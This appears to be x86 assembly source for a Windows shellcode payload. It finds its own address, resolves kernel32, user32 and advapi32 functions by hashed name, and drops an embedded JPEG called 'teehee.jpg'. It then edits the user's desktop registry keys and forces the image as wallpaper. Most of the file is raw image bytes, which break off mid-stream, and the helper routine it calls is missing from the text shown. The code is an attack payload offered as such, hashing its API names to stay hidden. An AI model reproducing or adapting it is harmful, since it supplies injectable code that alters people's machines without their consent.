BITS 32

NUM_FUNCTIONS                       equ 8

CREATEFILE                          equ 0x4    
WRITEFILE                           equ 0x8
CLOSEHANDLE                         equ 0xc
SYSTEMPARAMETERSINFO                equ 0x10
LOADLIBRARY                         equ 0x14
REGOPENKEY                          equ 0x18
REGCLOSEKEY                         equ 0x1c
REGSETVALUE                         equ 0x20

    call geteip
geteip:
    pop ebx
    
    push    ebp                 ; wouldn't normally bother with a stack frame, but
    mov     ebp, esp            ; we need ebp to mean something since we're 
    sub     esp, 4 * NUM_FUNCTIONS  ; using it to reference local variables
    sub     esp, 8              ; and two more for our file handle and bytes written
    
    push    NUM_FUNCTIONS
    lea     esi, [ebp - 4]
    push    esi
    lea     esi, [FUNCTION_HASHES - geteip + ebx]
    push    esi
    call    LoadAll
    
    
    push    dword 0             ; HANDLE hTemplateFile
    push    dword 0x80          ; DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    push    dword 2             ; DWORD dwCreationDisposition = CREATE_ALWAYS  
    push    dword 0             ; LPSECURITY_ATTRIBUTES lpSecurityAttributes
    push    dword 0             ; DWORD dwShareMode
    push    dword 0x40000000    ; DWORD dwDesiredAccess = GENERIC_WRITE
    lea     esi, [FILENAME - geteip + ebx]
    push    esi                 ; LPCTSTR lpFileName
    call    [ebp - CREATEFILE]
    
    mov     [ebp - 0x24], eax   ; save our file handle
    
    mov     ecx, ebp
    sub     ecx, 0x28           ; pointer to our lpNumberOfBytesWritten

    push    dword 0             ; LPOVERLAPPED lpOverlapped
    push    ecx                 ; LPDWORD lpNumberOfBytesWritten
    push    dword IMAGE_LENGTH  ; DWORD nNumberOfBytesToWrite
    lea     esi, [IMAGE - geteip + ebx]
    push    esi                 ; LPCVOID lpBuffer
    push    dword [ebp - 0x24]  ; HANDLE hFile
    call    [ebp - WRITEFILE]
    
    push    dword [ebp - 0x24]  ; HANDLE hObject
    call    [ebp - CLOSEHANDLE]
    
    ; load advapi32.dll
    lea     esi, [ADVAPI - geteip + ebx]
    push    esi
    call    [ebp - LOADLIBRARY]
    
    mov     ecx, ebp
    sub     ecx, 0x28           ; pointer to our registry key handle
    
    push    ecx                 ; PHKEY phkResult
    push    dword 0x2           ; REGSAM samDesired = KEY_SET_VALUE
    push    dword 0             ; DWORD ulOptions
    lea     esi, [REGKEY - geteip + ebx]
    push    esi                 ; LPCTSTR lpSubKey    
    push    dword 0x80000001    ; HKEY hKey = HK_CURRENT_USER
    call    [ebp - REGOPENKEY]
    
    push    dword 0x2           ; DWORD cbData 
    lea     esi, [TILE_VAL - geteip + ebx]
    push    esi                 ; LPCVOID lpData
    push    dword 0x1           ; DWORD dwType = REG_SZ
    lea     esi, [REGTILE - geteip + ebx]
    push    esi                 ; LPCTSTR lpValueName
    push    dword 0x0           ; LPCTSTR lpSubKey
    push    dword [ebp - 0x28]  ; HKEY Key
    call    [ebp - REGSETVALUE]
    
    push    dword 0x2           ; DWORD cbData 
    lea     esi, [STYLE_VAL - geteip + ebx]
    push    esi                 ; LPCVOID lpData
    push    dword 0x1           ; DWORD dwType = REG_SZ
    lea     esi, [REGSTYLE - geteip + ebx]
    push    esi                 ; LPCTSTR lpValueName
    push    dword 0x0           ; LPCTSTR lpSubKey
    push    dword [ebp - 0x28]  ; HKEY Key
    call    [ebp - REGSETVALUE]
    
    push    dword [ebp - 0x28]  ; HKEY Key
    call    [ebp - REGCLOSEKEY]
    
    push    dword 0x3           ; UINT fWinIni = SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
    lea     esi, [FILENAME - geteip + ebx]
    push    esi                 ; PVOID pvParam
    push    dword 0             ; UINT uiParam
    push    dword 0x14          ; UINT uiAction = SPI_SETDESKWALLPAPER     
    call    [ebp - SYSTEMPARAMETERSINFO]
    
    mov     esp, ebp
    pop     ebp
    ret
    
    
FUNCTION_HASHES:
    dd 0x000d4e88   ; KERNEL32_HASH
    dd 0x00067746   ; KERNEL32_CREATEFILEA
    dd 0x000d4e88   ; KERNEL32_HASH
    dd 0x0001ca42   ; KERNEL32_WRITEFILE
    dd 0x000d4e88   ; KERNEL32_HASH
    dd 0x00067e1a   ; KERNEL32_CLOSEHANDLE
    dd 0x00038f88   ; USER32_HASH
    dd 0x1cfa486e   ; USER32_SYSTEMPARAMETERSINFOA
    dd 0x000d4e88   ; KERNEL32_HASH
    dd 0x000d5786   ; KERNEL32_LOADLIBRARYA
    dd 0x000ca608   ; ADVAPI32_HASH
    dd 0x001b34ba   ; ADVAPI32_REGOPENKEYEX
    dd 0x000ca608   ; ADVAPI32_HASH
    dd 0x0006c14e   ; ADVAPI32_REGCLOSEKEY
    dd 0x000ca608   ; ADVAPI32_HASH
    dd 0x006cf5de   ; ADVAPI32_REGSETKEYVALUEA
    
FILENAME:   db 'teehee.jpg', 0
ADVAPI:     db 'Advapi32.dll', 0
REGKEY:     db 'Control Panel\Desktop', 0
REGSTYLE:   db 'WallpaperStyle', 0
STYLE_VAL:  db '0', 0
REGTILE:    db 'TileWallpaper', 0
TILE_VAL:   db '1', 0

IMAGE:
db	`\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46`
db	`\x00\x01\x01\x01\x01\x2c\x01\x2c\x00\x00`
db	`\xff\xe1\x00\xe2\x45\x78\x69\x66\x00\x00`
db	`\x4d\x4d\x00\x2a\x00\x00\x00\x08\x00\x09`
db	`\x01\x1a\x00\x05\x00\x00\x00\x01\x00\x00`
db	`\x00\x7a\x01\x1b\x00\x05\x00\x00\x00\x01`
db	`\x00\x00\x00\x82\x01\x28\x00\x03\x00\x00`
db	`\x00\x01\x00\x02\x00\x00\x01\x31\x00\x02`
db	`\x00\x00\x00\x10\x00\x00\x00\x8a\x01\x3e`
db	`\x00\x05\x00\x00\x00\x02\x00\x00\x00\x9a`
db	`\x01\x3f\x00\x05\x00\x00\x00\x06\x00\x00`
db	`\x00\xaa\x51\x10\x00\x01\x00\x00\x00\x01`
db	`\x01\x00\x00\x00\x51\x11\x00\x04\x00\x00`
db	`\x00\x01\x00\x00\x2e\x16\x51\x12\x00\x04`
db	`\x00\x00\x00\x01\x00\x00\x2e\x16\x00\x00`
db	`\x00\x00\x00\x04\x92\x95\x00\x00\x03\xe8`
db	`\x00\x04\x92\x95\x00\x00\x03\xe8\x70\x61`
db	`\x69\x6e\x74\x2e\x6e\x65\x74\x20\x34\x2e`
db	`\x30\x2e\x35\x00\x00\x00\x7a\x25\x00\x01`
db	`\x86\xa0\x00\x00\x80\x83\x00\x01\x86\xa0`
db	`\x00\x00\xf9\xff\x00\x01\x86\xa0\x00\x00`
db	`\x80\xe9\x00\x01\x86\xa0\x00\x00\x75\x30`
db	`\x00\x01\x86\xa0\x00\x00\xea\x60\x00\x01`
db	`\x86\xa0\x00\x00\x3a\x98\x00\x01\x86\xa0`
db	`\x00\x00\x17\x6f\x00\x01\x86\xa0\xff\xdb`
db	`\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08`
db	`\x07\x07\x07\x09\x09\x08\x0a\x0c\x14\x0d`
db	`\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d`
db	`\x1a\x1f\x1e\x1d\x1a\x1c\x1c\x20\x24\x2e`
db	`\x27\x20\x22\x2c\x23\x1c\x1c\x28\x37\x29`
db	`\x2c\x30\x31\x34\x34\x34\x1f\x27\x39\x3d`
db	`\x38\x32\x3c\x2e\x33\x34\x32\xff\xdb\x00`
db	`\x43\x01\x09\x09\x09\x0c\x0b\x0c\x18\x0d`
db	`\x0d\x18\x32\x21\x1c\x21\x32\x32\x32\x32`
db	`\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32`
db	`\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32`
db	`\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32`
db	`\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32`
db	`\x32\x32\x32\x32\x32\x32\xff\xc0\x00\x11`
db	`\x08\x00\x7a\x00\x64\x03\x01\x22\x00\x02`
db	`\x11\x01\x03\x11\x01\xff\xc4\x00\x1f\x00`
db	`\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00`
db	`\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03`
db	`\x04\x05\x06\x07\x08\x09\x0a\x0b\xff\xc4`
db	`\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04`
db	`\x03\x05\x05\x04\x04\x00\x00\x01\x7d\x01`
db	`\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41`
db	`\x06\x13\x51\x61\x07\x22\x71\x14\x32\x81`
db	`\x91\xa1\x08\x23\x42\xb1\xc1\x15\x52\xd1`
db	`\xf0\x24\x33\x62\x72\x82\x09\x0a\x16\x17`
db	`\x18\x19\x1a\x25\x26\x27\x28\x29\x2a\x34`
db	`\x35\x36\x37\x38\x39\x3a\x43\x44\x45\x46`
db	`\x47\x48\x49\x4a\x53\x54\x55\x56\x57\x58`
db	`\x59\x5a\x63\x64\x65\x66\x67\x68\x69\x6a`
db	`\x73\x74\x75\x76\x77\x78\x79\x7a\x83\x84`
db	`\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95`
db	`\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6`
db	`\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7`
db	`\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8`
db	`\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9`
db	`\xda\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9`
db	`\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9`
db	`\xfa\xff\xc4\x00\x1f\x01\x00\x03\x01\x01`
db	`\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00`
db	`\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07`
db	`\x08\x09\x0a\x0b\xff\xc4\x00\xb5\x11\x00`
db	`\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04`
db	`\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11`
db	`\x04\x05\x21\x31\x06\x12\x41\x51\x07\x61`
db	`\x71\x13\x22\x32\x81\x08\x14\x42\x91\xa1`
db	`\xb1\xc1\x09\x23\x33\x52\xf0\x15\x62\x72`
db	`\xd1\x0a\x16\x24\x34\xe1\x25\xf1\x17\x18`
db	`\x19\x1a\x26\x27\x28\x29\x2a\x35\x36\x37`
db	`\x38\x39\x3a\x43\x44\x45\x46\x47\x48\x49`
db	`\x4a\x53\x54\x55\x56\x57\x58\x59\x5a\x63`
db	`\x64\x65\x66\x67\x68\x69\x6a\x73\x74\x75`
db	`\x76\x77\x78\x79\x7a\x82\x83\x84\x85\x86`
db	`\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97`
db	`\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8`
db	`\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9`
db	`\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca`
db	`\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xe2`
db	`\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf2\xf3`
db	`\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\x00`
db	`\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f`
db	`\x00\xf7\xfa\x28\xa2\x80\x0a\x2a\x86\xb5`
db	`\xad\xe9\xde\x1e\xd2\xa6\xd4\xf5\x5b\xa4`
db	`\xb6\xb4\x84\x65\xe4\x6f\xd0\x00\x39\x24`
db	`\xfa\x0a\xf2\x9b\xff\x00\xda\x3b\xc3\x50`
db	`\xa4\xc2\xc7\x4a\xd4\xee\x64\x50\x7c\xb3`
db	`\x22\xa4\x68\xe7\xdc\xee\x24\x0f\xc3\xf0`
db	`\xa0\x0f\x65\x27\x03\x27\xa5\x70\xda\xef`
db	`\xc5\xef\x04\xe8\x13\xb5\xbd\xc6\xb0\x97`
db	`\x17\x0a\x70\xd1\xda\x21\x9b\x1f\x56\x1f`
db	`\x28\x3e\xd9\xae\x0b\x44\xb4\xf1\x67\xc6`
db	`\xab\x39\x2f\xf5\x4d\x7d\x34\xaf\x0f\x09`
db	`\x5a\x26\xd3\xf4\xec\xf9\x8c\x47\x55\x7c`
db	`\xfb\x10\x7e\x62\x7f\xdd\x15\xe9\x3e\x1e`
db	`\xf8\x69\xe1\x1f\x0d\x40\xa9\x65\xa3\x5b`
db	`\xc9\x28\xeb\x71\x72\x82\x59\x0f\xe2\xdd`
db	`\x3f\x0c\x0a\x00\xcb\xd2\x3e\x35\xf8\x1b`
db	`\x57\xb8\x5b\x71\xaa\x35\x9c\x8c\x70\xbf`
db	`\x6c\x88\xc6\xa7\xfe\x05\xca\x8f\xc4\x8a`
db	`\xef\xd1\xd2\x48\xd6\x48\xd9\x5d\x18\x65`
db	`\x59\x4e\x41\x1e\xa2\xb9\x8f\x12\xfc\x3c`
db	`\xf0\xc7\x8a\x74\xf9\x2d\xaf\x74\xab\x68`
db	`\xe5\x65\x21\x2e\x60\x8d\x52\x58\xcf\x62`
db	`\x18\x0f\xd0\xe4\x57\x87\x78\x63\xc5\xfa`
db	`\xff\x00\xc2\x4f\x1b\xbf\x84\xb5\x99\x5a`
db	`\xe7\x47\x17\x02\x32\x1c\x9c\x46\x8c\x7e`
db	`\x59\x63\x3d\x86\x0e\x4a\xf4\xeb\xd0\xd0`
db	`\x07\xd3\x54\x51\x45\x00\x14\x51\x45\x00`
db	`\x14\x51\x45\x00\x14\x51\x45\x00\x78\x47`
db	`\xed\x2d\x73\x3a\x69\xbe\x1e\xb5\x56\x22`
db	`\xde\x59\xa7\x91\xc7\x62\xca\x10\x2f\xe8`
db	`\xed\x5e\x31\xe0\xef\x09\xdc\x78\xbf\x5c`
db	`\x8e\xc2\x2b\x9b\x6b\x68\x41\x0d\x3c\xf3`
db	`\xcc\xa9\xe5\xa7\x72\x01\x39\x63\xec\x3f`
db	`\x4a\xf6\x3f\x8a\x5e\x20\xd0\xfc\x49\xf1`
db	`\x3f\x41\xf0\xbd\xfd\xd5\xbc\x5a\x4e\x9b`
db	`\x31\x93\x51\x9e\x57\xda\xa5\x88\x04\xc7`
db	`\xbb\xb7\x0a\x17\x8e\xed\xed\x58\x5f\x10`
db	`\x3e\x18\xe9\x57\x30\xd9\x5d\xfc\x37\xb5`
db	`\x8f\x52\x85\x8b\xfd\xa8\x5a\x5f\x0b\x82`
db	`\x9d\x36\x80\xa5\x89\xc7\xde\xf5\xfc\x28`
db	`\x03\xa0\xd1\x7c\x7b\xe1\xcf\x06\xfc\x52`
db	`\xf1\x5d\xb4\x77\x4f\x36\x97\x7b\x25\xbf`
db	`\x90\x96\xa8\x65\xdf\x3e\xd0\x1c\x8c\x71`
db	`\xd4\xb6\x4f\x7c\x71\x9a\xf4\x7f\x1e\xfc`
db	`\x47\xd1\xfc\x01\x69\x0b\x5f\x09\x2e\x2f`
db	`\x2e\x32\x61\xb5\x84\x8d\xcc\x07\x56\x24`
db	`\xfd\xd5\xf7\xfc\x81\xe6\xbc\xef\xe1\xde`
db	`\x95\x79\xa1\x78\x8b\x49\x83\x4e\xf8\x7b`
db	`\x77\x6f\x03\x21\x5d\x43\x51\xd4\xd4\x79`
db	`\xca\xc7\xf8\xe3\x63\xc0\x51\xcf\xca\x06`
db	`\x4f\xd6\xbc\xd3\xe3\x1d\xd5\xfe\xa3\xf1`
db	`\x5b\x55\x8e\xe6\x29\x03\x44\xe9\x05\xbc`
db	`\x64\x7f\xcb\x30\xa3\x6e\x3d\x9b\x25\xbf`
db	`\xe0\x54\x01\xeb\x9a\x1f\xed\x0d\xa3\xea`
db	`\x33\x3a\xdf\xe8\x77\xf6\x71\xc6\xbb\xe4`
db	`\x9a\x16\x13\xac\x6b\x90\x37\x36\x00\x20`
db	`\x64\x8e\x80\xf5\xac\x1f\xda\x06\xdf\x4c`
db	`\xd5\xf4\x1f\x0f\xf8\xaf\x4d\x9e\x29\xd2`
db	`\x57\x6b\x61\x3c\x47\x22\x44\x20\xb2\xfe`
db	`\x45\x5f\x8e\xd9\x35\x9b\xf0\x83\xe1\xa6`
db	`\xae\xba\xbd\xc6\xaf\xe2\x0b\x17\xb2\xd1`
db	`\xcd\x94\xd0\xba\xdc\xfc\x86\x60\xeb\xb4`
db	`\xf0\x79\x0a\x01\x27\x27\xd0\x57\x23\xa9`
db	`\xda\xde\xda\x7c\x3a\xf0\xf6\x89\x2b\xb3`
db	`\x2e\xa5\xaa\xcf\x77\x6a\xa7\xfe\x79\x61`
db	`\x23\x46\xc7\x60\xc4\xb9\x1f\x9f\x7a\x00`
db	`\xfa\xf2\xd1\xda\x4b\x28\x1d\x8e\x59\xa3`
db	`\x52\x4f\xbe\x2a\x6a\x45\x50\x88\xa8\xbc`
db	`\x05\x18\x14\xb4\x00\x51\x45\x14\x00\x51`
db	`\x45\x14\x00\x57\x3f\xe3\x6f\x12\xc5\xe1`
db	`\x1f\x07\xea\x3a\xcc\x9b\x4b\xc3\x1e\x21`
db	`\x43\xfc\x72\x9e\x10\x7e\x64\x67\xdb\x35`
db	`\xd0\x57\x83\x7c\x5f\xbd\x9f\xc6\x7f\x10`
db	`\x74\x3f\x87\xda\x7c\x87\x62\xca\xb2\xdd`
db	`\x95\xfe\x16\x61\x9c\x9f\xf7\x63\xcb\x7f`
db	`\xc0\xa8\x01\xdf\x0b\x7e\x15\xe8\xfe\x23`
db	`\xf0\x74\x9a\xdf\x8a\xac\x9a\xf2\xef\x53`
db	`\x9d\xa6\x8d\xda\x57\x46\x54\xc9\x1b\xbe`
db	`\x52\x39\x63\xb8\xfd\x31\x5a\xd7\xdf\xb3`
db	`\xbf\x87\x1d\xfc\xdd\x2b\x55\xd4\xec\x26`
db	`\x07\x2a\x77\xac\x8a\xbf\x4e\x01\xfd\x6b`
db	`\xd6\xac\xed\x20\xb0\xb1\xb7\xb3\xb6\x8c`
db	`\x47\x6f\x6f\x1a\xc5\x1a\x0e\x8a\xaa\x30`
db	`\x07\xe4\x2a\x7a\x00\xf1\xc8\xbe\x1f\x7c`
db	`\x50\xf0\xfb\x7f\xc4\x8b\xc7\x89\x79\x12`
db	`\xf2\x23\xd4\x15\x8e\x7d\xb0\xc1\xf1\xf8`
db	`\x11\x54\x75\x7d\x1f\xc5\x9a\xdb\xaf\xfc`
db	`\x26\x7f\x0d\xf4\xfd\x65\x90\x6c\x17\xba`
db	`\x65\xe2\xc3\x30\x5f\xfb\xeb\x2d\xf4\xe0`
db	`\x57\xb8\xd1\x40\x1e\x4b\xe1\xaf\x84\x1e`
db	`\x19\xb9\xb4\x8e\xe6\x48\x3c\x47\x6d\x6e`
db	`\x5f\xe7\xd2\xf5\x0b\x90\xa8\x48\xfe\xf2`
db	`\xa7\x51\xf8\xf3\x5c\x5f\x89\x5d\x3c\x51`
db	`\xfb\x48\x69\x1a\x4d\xba\xaf\xd9\x34\xb9`
db	`\x61\x81\x51\x06\x14\x2c\x43\xcd\x71\x8e`
db	`\xd8\x3b\x97\xf0\xaf\xa0\xf5\x3d\x42\x1d`
db	`\x27\x4a\xbc\xd4\x6e\x4e\x20\xb5\x85\xe6`
db	`\x90\xff\x00\xb2\xa0\x93\xfc\xab\xc0\x7e`
db	`\x01\xe9\x97\x1a\xef\x8c\xf5\xcf\x17\xde`
db	`\xae\xe2\xbb\xd4\x31\xef\x34\xad\xb9\x88`
db	`\xfa\x0c\xff\x00\xdf\x42\x80\x3e\x89\xa2`
db	`\x8a\x28\x00\xa2\x8a\x28\x00\xa2\x8a\x28`
db	`\x00\xaf\x14\xf0\xb5\xa8\xb9\xfd\xa6\xbc`
db	`\x51\x72\xcb\xc5\xb5\xa6\x54\xfa\x31\x58`
db	`\x97\xf9\x16\xaf\x6b\xaf\x25\xf0\x42\xe7`
db	`\xe3\xbf\x8e\xdc\x8f\x98\x47\x10\x1f\x42`
db	`\x17\xfc\x05\x00\x7a\xd5\x14\x51\x40\x10`
db	`\x5f\x5d\xc7\x61\xa7\xdc\xde\x4c\x71\x15`
db	`\xbc\x4d\x2b\xfd\x14\x12\x7f\x95\x7c\xfb`
db	`\xa5\x78\xdf\x5b\xf0\xb7\xc1\xbb\x9f\x12`
db	`\xbd\xe3\x4b\xac\x6b\x9a\xbb\x1b\x67\x9f`
db	`\xf7\x80\x28\x00\x31\x00\xf6\xf9\x18\x7b`
db	`\x64\x57\xaa\x7c\x59\xd4\x5b\x4d\xf8\x65`
db	`\xad\x18\xf2\x66\xb9\x88\x5a\x46\xa3\xab`
db	`\x19\x58\x21\x03\xf0\x26\xbc\xde\x6f\x0f`
db	`\xc7\xac\xfc\x46\xf0\x7f\x81\xa2\xc4\x96`
db	`\x3e\x19\xb1\x49\xf5\x0c\x7d\xd3\x2f\xca`
db	`\xcc\x0f\xfb\xc7\x60\xff\x00\x81\x1a\x00`
db	`\xe8\x3e\x33\xf8\x92\xea\xcf\xe1\x5d\x95`
db	`\x94\xcb\xe5\xea\x7a\xcf\x95\x14\x91\x27`
db	`\x55\xc0\x0f\x20\x1f\x8e\x17\xfe\x05\x5d`
db	`\xb7\xc3\xef\x0b\x47\xe0\xff\x00\x05\xe9`
db	`\xfa\x50\x50\x2e\x02\x79\xb7\x2c\x3f\x8a`
db	`\x66\xe5\xbf\x2e\x83\xd8\x0a\xf2\xff\x00`
db	`\x18\x48\x7c\x57\xfb\x46\xe8\x3a\x0b\x82`
db	`\xd6\xba\x50\x49\x1d\x0f\x42\xc1\x7c\xf6`
db	`\x3f\x88\x08\x3f\x0a\xf7\x09\xef\x6d\x2d`
db	`\x7f\xe3\xe2\xea\x18\x7f\xeb\xa4\x81\x7f`
db	`\x9d\x00\x4f\x45\x47\x14\xf1\x4e\x9b\xe1`
db	`\x95\x24\x5f\xef\x23\x02\x3f\x4a\xa5\xae`
db	`\x6b\x76\x1e\x1d\xd1\xee\x75\x5d\x4e\x71`
db	`\x0d\xad\xba\xee\x66\x3d\x4f\xa0\x03\xb9`
db	`\x27\x80\x28\x02\x1f\x12\xf8\x9f\x4a\xf0`
db	`\x96\x8f\x26\xa9\xab\xdc\x88\x60\x4e\x14`
db	`\x0e\x5a\x46\xec\xaa\x3b\x9f\xf3\xd2\xb8`
db	`\x9f\xf8\x5c\x1f\x61\x4b\x3b\xed\x7b\xc2`
db	`\xda\x9e\x97\xa2\xdf\x11\xf6\x6d\x41\x99`
db	`\x64\x52\x0f\x20\xba\xaf\x29\x91\xce\x39`
db	`\x38\xf5\xae\x47\xc3\xba\x36\xa9\xf1\x97`
db	`\xc5\xa3\xc5\x3e\x21\x89\xe0\xf0\xcd\x9b`
db	`\x95\xb1\xb2\x6e\x92\xe0\xf4\xf7\x19\x1f`
db	`\x33\x77\x3c\x0e\x9c\x75\x7f\x19\xa5\x1a`
db	`\x9e\x8b\xa7\x78\x2e\xc1\x16\x5d\x53\x58`
db	`\xba\x8d\x62\x88\x0f\xf5\x51\xa1\xdc\xd2`
db	`\x1f\x40\x31\xf9\x67\xd2\x80\x3d\x3a\x39`
db	`\x12\x58\x92\x48\xd8\x3c\x6e\xa1\x95\x94`
db	`\xe4\x10\x7a\x11\x45\x41\xa7\xd9\xa6\x9d`
db	`\xa6\xda\xd9\x46\x49\x8e\xda\x14\x85\x49`
db	`\xea\x42\x80\x07\xf2\xa2\x80\x2c\xd7\x90`
db	`\xf8\x4e\x5f\xb3\xfe\xd1\x9e\x33\xb4\x63`
db	`\x83\x35\x9c\x72\x8c\xf7\xc0\x88\xff\x00`
db	`\xec\xf5\xeb\xd5\xe2\xde\x29\x90\x78\x57`
db	`\xf6\x8a\xd0\x35\x87\x3b\x6d\x75\x8b\x71`
db	`\x6d\x2b\x1e\x3e\x7e\x63\xfd\x0f\x94\x68`
db	`\x03\xda\x68\xa2\xb1\xfc\x53\xab\x5d\xe8`
db	`\x7e\x1a\xbd\xd4\xac\x6c\x64\xbe\xb9\x81`
db	`\x41\x48\x23\x52\xc4\xe5\x80\x27\x03\x92`
db	`\x00\x25\x88\x1d\x40\xa0\x0e\x5b\xc7\xf3`
db	`\x45\x7f\xe2\x5f\x0d\xe8\xcd\xf3\xc5\x6d`
db	`\x2c\x9a\xd5\xda\x0e\xa2\x3b\x75\x3b\x32`
db	`\x3d\x19\xd8\x0f\xc2\xb3\x3e\x08\xe9\x33`
db	`\xbe\x89\xa8\xf8\xbb\x51\x1b\xb5\x0d\x7a`
db	`\xe5\xe6\x2c\x7a\x88\xc3\x1c\x7d\x32\xc5`
db	`\x8f\xd3\x6d\x65\x58\xf8\xc7\xc2\xba\x2e`
db	`\x91\xad\x78\xcf\xcd\xd4\x75\xad\x5a\x49`
db	`\xa3\xb0\xba\x17\x89\xe4\xb3\x6e\xe7\xcb`
db	`\x8d\x3a\x2a\x00\x18\xe3\x9f\xbb\xd7\xbd`
db	`\x6c\x7c\x28\xd5\xa0\x3a\x8e\xab\xa1\xe8`
db	`\xd7\x0f\x7b\xe1\xcb\x78\xa2\xba\xb1\x99`
db	`\xf9\x6b\x5f\x37\x93\x6e\xc7\xd4\x1c\x90`
db	`\x3b\x73\x9a\x00\xe7\xb5\xdf\x86\xde\x20`
db	`\xf1\x0f\xc6\xfd\x57\x50\x8e\xea\xf7\x48`
db	`\xd3\x26\xb7\x8d\x93\x51\xb6\x3c\xbe\x22`
db	`\x8d\x1a\x30\x41\x04\x12\x43\x75\xf4\xac`
db	`\xfd\x63\xe1\x87\x85\x74\x7f\x1a\x69\x7a`
db	`\x26\xa1\x65\xaf\xde\x41\xa9\xa7\xc9\xaa`
db	`\x0b\xb5\x21\x64\xc9\xc8\x65\xd9\xc0\x03`
db	`\x04\x9c\xf7\xfa\xd7\xbe\xdd\x40\x6e\x6d`
db	`\x26\x80\x4b\x24\x26\x44\x28\x24\x88\xe1`
db	`\xd3\x23\x19\x53\xd8\x8e\xd5\xe4\x5a\x9f`
db	`\xc0\x7d\x2e\xf6\x47\xba\xd5\xbc\x5b\xac`
db	`\xce\xe4\xe3\xcd\xb9\x95\x1b\xa9\xc0\x19`
db	`\x61\xeb\x40\x18\x5a\xf7\xc2\x7b\xaf\x04`
db	`\xda\x5c\x78\x93\xc1\x5e\x2c\x96\xd8\x59`
db	`\xa7\x99\x24\x57\x13\x2a\xe5\x47\x38\xde`
db	`\x30\xa7\xfd\xd6\x18\x3e\xb5\x6b\x42\xd2`
db	`\x7c\x47\xf1\x9d\xf4\xed\x53\xc5\x69\xf6`
db	`\x2f\x0e\x59\xa8\x29\x6b\x16\x57\xed\xb2`
db	`\x81\xcb\xfb\x29\xf5\xec\x38\x1d\x49\xac`
db	`\xbd\x7b\xf6\x76\xd4\xac\xec\xe4\x97\xc3`
db	`\xfa\xd8\xbb\x23\x9f\xb2\xdc\x27\x96\x5f`
db	`\x1c\xe0\x30\x24\x13\xf5\x00\x57\x55\xf0`
db	`\xa7\xe2\x7d\xd6\xab\x7c\xde\x11\xf1\x34`
db	`\x22\xd7\x5a\xb6\x06\x38\x5b\x60\x8f\xcd`
db	`\xdb\xd5\x0a\xf4\x0c\x00\xed\xc1\x03\xdb`
db	`\x90\x0e\xc3\xc6\x7e\x32\xd1\xbe\x1c\x78`
db	`\x65\x24\x68\xe3\x0e\x13\xca\xb1\xb1\x8b`
db	`\x0b\xbc\x81\xc0\x03\xb2\x8e\x32\x7b\x7d`
db	`\x70\x2b\x07\xe1\x66\x81\xa8\xdd\x9b\x8f`
db	`\x1c\xf8\x94\x99\x35\xad\x59\x7f\x70\x8c`
db	`\x30\x2d\xad\xff\x00\x85\x54\x76\xcf\x07`
db	`\xe9\x8e\xe4\xd7\x2b\xe3\xaf\x86\x1e\x2a`
db	`\xbf\xf1\xf4\x7e\x25\x2b\x17\x89\x2c\x16`
db	`\x65\x61\x60\xf2\x88\x19\x23\x07\x22\x3e`
db	`\x7e\x5d\xbe\xe3\xaf\x39\x1c\xd7\xa9\x78`
db	`\x4f\xc6\x9a\x67\x8a\xc5\xdd\xbd\xb4\x73`
db	`\xda\x6a\x16\x2d\xe5\xdd\xd8\xdc\xa6\xd9`
db	`\x20\x6e\x47\x6e\x08\xc8\x3c\x8a\x00\xe9`
db	`\x68\xa2\x8a\x00\x2b\xcc\xbe\x36\xf8\x36`
db	`\xeb\xc5\x1e\x14\x86\xf7\x4d\x46\x7d\x47`
db	`\x4a\x76\x9a\x34\x4f\xbc\xe8\x40\xde\x17`
db	`\xdf\x85\x23\xfd\xdc\x77\xae\xd7\xc5\x1e`
db	`\x22\xb7\xf0\xb6\x81\x3e\xaf\x73\x0c\xd3`
db	`\xa4\x4c\x88\x21\x80\x02\xf2\x33\xb0\x50`
db	`\x14\x1e\xf9\x34\xdf\x0d\xf8\xa7\x4b\xf1`
db	`\x55\x8b\xdc\xe9\xd2\xb6\xf8\x9b\xcb\xb8`
db	`\xb7\x95\x76\x4b\x03\xf7\x57\x53\xc8\x34`
db	`\x01\xcf\x7c\x2d\xf1\xf5\xbf\x8d\xbc\x35`
db	`\x1f\x9d\x2a\x8d\x62\xd1\x44\x77\x91\x13`
db	`\x82\x48\xe0\x48\x07\xa3\x7e\x87\x22\xbb`
db	`\xba\xf9\xd7\xc5\x3a\x44\xfa\xbf\xc6\x69`
db	`\x23\xf8\x6e\x9f\x63\xd5\x2c\xa2\x69\x35`
db	`\x0b\xb8\xe4\xd9\x0f\x9b\xdc\x1e\x08\xc9`
db	`\xe1\x48\xe8\x49\x39\x1c\x13\x5d\x27\x86`
db	`\x7e\x3b\x5a\xc7\x72\xfa\x47\x8d\x2d\xbf`
db	`\xb3\xf5\x0b\x77\x30\xc9\x75\x07\xef\x21`
